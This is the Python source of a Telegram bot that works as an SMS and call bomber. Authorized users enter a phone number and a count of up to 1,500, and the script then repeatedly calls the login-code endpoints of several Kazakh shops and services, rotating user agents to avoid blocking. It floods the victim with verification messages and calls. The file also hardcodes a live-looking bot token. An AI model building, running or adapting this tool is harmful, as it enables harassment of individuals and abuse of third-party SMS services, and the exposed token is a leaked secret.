import telebot
import requests
import re
from random import choice
from concurrent.futures import ThreadPoolExecutor
import time
import os
from keep_alive import keep_alive
keep_alive()

API_TOKEN = '7812192241:AAGgCq2diRqxAlH1OfJGmJWWfu76PT4zlqg'
OWNER_ID = 7268545025

bot = telebot.TeleBot(API_TOKEN)

# Списки доступа
authorized_users = {OWNER_ID}
whitelist = set()

# Регулярное выражение для проверки номера телефона
PHONE_REGEX = r"^[78]\d{10}$"
stop_sending = False  # Флаг для остановки рассылки

# Список User-Agent
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1",
   "Mozilla/5.0 (iPad; CPU OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Redmi Note 10 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
    "Mozilla/5.0 (Linux; U; Android 10; en-US; SM-G975F Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; Mi A2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0",
    "Mozilla/5.0 (Linux; U; Android 6.0; en-US; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36"
]

# Данные сервисов
SERVICES = {
    "mechta": {
        "url": "https://www.mechta.kz/api/v2/send-sms",
        "phone_f": 1,
        "method": "POST",
        "data": {"phone": "%NUMBER%", "type": "login"},
        "delay": 4
    },
    "naimi_sms": {
        "url": "https://naimi.kz/api/app/pub/login/code",
        "phone_f": 2,
        "method": "POST",
        "data": {"phone": "%NUMBER%", "type": "sms"},
        "delay": 3
    },
    "naimi_call": {
        "url": "https://naimi.kz/api/app/pub/login/code",
        "phone_f": 2,
        "method": "POST",
        "data": {"phone": "%NUMBER%", "type": "call"},
        "delay": 2.5
    },
    "mycar": {
        "url": "https://sso.mycar.kz/auth/login/",
        "phone_f": 0,
        "method": "POST",
        "data": {"phone_number": "%NUMBER%"},
        "delay": 60
}
}

# Счетчики успешных и неуспешных запросов
success_count = {}
failure_count = {}

# Инициализация счетчиков для каждого сервиса
for service in SERVICES.keys():
    success_count[service] = 0
    failure_count[service] = 0
success_count["ayanmarket"] = 0
failure_count["ayanmarket"] = 0

# Функция отправки SMS на Аянмаркет
def send_sms_to_ayanmarket(phone):
    global success_count, failure_count
    url = "https://ayanmarketapi.kz/api/site/client/code"
    data = {"name": "test", "surname": "test", "phone": phone}
    headers = {"Content-Type": "application/json", "User-Agent": choice(USER_AGENTS)}

    try:
        response = requests.post(url, json=data, headers=headers)
        if response.status_code == 200:
            success_count["ayanmarket"] += 1
        else:
            failure_count["ayanmarket"] += 1
    except Exception:
        failure_count["ayanmarket"] += 1

    time.sleep(30)

# Команда /start
@bot.message_handler(commands=['start'])
def start_cmd(message):
    if message.from_user.id in authorized_users:
        bot.send_message(message.chat.id, "Сәлем, у вас есть доступ! Введите номер телефона.")
    else:
        bot.send_message(message.chat.id, "Кешіріңіз, доступ только для авторизованных пользователей.")

# Команда для добавления пользователя
@bot.message_handler(commands=['add'])
def add_user_cmd(message):
    if message.from_user.id == OWNER_ID:
        try:
            user_id = int(message.text.split()[1])
            authorized_users.add(user_id)
            bot.send_message(message.chat.id, f"Пользователь {user_id} добавлен в авторизованные.")
        except (IndexError, ValueError):
            bot.send_message(message.chat.id, "Введите корректный ID пользователя после команды /add.")
    else:
        bot.send_message(message.chat.id, "Эта команда доступна только владельцу бота.")

# Команда /stop
@bot.message_handler(commands=['stop'])
def stop_cmd(message):
    global stop_sending
    if message.from_user.id == OWNER_ID:
        stop_sending = True
        bot.send_message(message.chat.id, "Рассылка остановлена.")

# Проверка номера телефона
@bot.message_handler(func=lambda msg: re.match(PHONE_REGEX, msg.text))
def get_phone(message):
    phone = message.text
    if phone in whitelist:
        bot.send_message(message.chat.id, "Этот номер в белом списке, сообщения на него не отправляются.")
    else:
        msg = bot.send_message(message.chat.id, "Сколько сообщений отправить? (от 1 до 1500)")
        bot.register_next_step_handler(msg, get_count, phone)

# Ввод количества сообщений
def get_count(message, phone):
    global stop_sending
    stop_sending = False
    try:
        count = int(message.text)
        if 1 <= count <= 1500:
            bot.send_message(message.chat.id, f"Номер {phone} получит {count} сообщений.")
            ThreadPoolExecutor().submit(send_messages, message.chat.id, phone, count)
        else:
            bot.send_message(message.chat.id, "Введите число от 1 до 1500.")
    except ValueError:
        bot.send_message(message.chat.id, "Введите корректное число.")

# Отправка сообщений
def send_messages(chat_id, phone, count):
    global stop_sending
    sent_count = 0
    progress_msg = bot.send_message(chat_id, f"Отправка сообщений началась: 0/{count}")
    with ThreadPoolExecutor(max_workers=5) as executor:
        for i in range(count):
            if stop_sending:
                bot.edit_message_text("Рассылка остановлена.", chat_id, progress_msg.message_id)
                break

            # Отправка на Аянмаркет
            executor.submit(send_sms_to_ayanmarket, phone)

            # Отправка на другие сервисы
            for service_name, service_info in SERVICES.items():
                executor.submit(send_to_service, chat_id, service_name, service_info, phone)

            sent_count += 1
            bot.edit_message_text(
                f"Отправлено сообщений: {sent_count}/{count}",
                chat_id,
                progress_msg.message_id
            )
            time.sleep(0.5)

    # Итоговая статистика
    summary = "Рассылка завершена.\n"
    for service in SERVICES.keys():
        summary += f"{service}: Успешно - {success_count[service]}, Ошибки - {failure_count[service]}\n"
    summary += f"ayanmarket: Успешно - {success_count['ayanmarket']}, Ошибки - {failure_count['ayanmarket']}"
    bot.edit_message_text(summary, chat_id, progress_msg.message_id)

# Отправка запроса к сервису
def send_to_service(chat_id, service_name, service_info, phone):
    global success_count, failure_count
    try:
        if service_info["url"].startswith("https://www.mechta.kz") and phone.startswith("8"):
            phone = "7" + phone[1:]

        phone_formatted = f"+{phone}" if service_info["phone_f"] == 0 else phone
        data = {k: v.replace("%NUMBER%", phone_formatted) if isinstance(v, str) else v for k, v in service_info["data"].items()}
        headers = {"User-Agent": choice(USER_AGENTS)}

        if service_info["method"] == "POST":
            response = requests.post(service_info["url"], json=data, headers=headers)
        else:
            response = requests.get(service_info["url"], params=data, headers=headers)

        if response.status_code == 200:
            success_count[service_name] += 1
        else:
            failure_count[service_name] += 1
    except Exception:
        failure_count[service_name] += 1
    time.sleep(service_info["delay"])

if __name__ == '__main__':
    bot.polling()
